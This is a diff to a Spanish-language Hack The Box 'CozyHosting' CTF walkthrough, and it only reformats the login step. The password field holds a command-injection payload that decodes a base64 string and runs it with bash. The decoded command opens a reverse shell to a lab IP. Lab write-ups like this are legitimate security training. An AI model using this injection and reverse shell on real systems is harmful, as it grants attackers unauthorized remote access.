@@ -105,8 +105,10 @@ dirsearch -u http://cozyhosting.htb/
 ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)
 
 - Procedemos a escribir 
-- Usario:  ```localhost  ```
--   Contraseña:  ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;  ```
+- Usario:
+ ```localhost  ```
+-   Contraseña:
+  ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;  ```
 -   Ya ingresado, revisamos el Burpsuite
 ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/afc53d27-78bb-44ab-969f-e6c2fa362e4d)
 
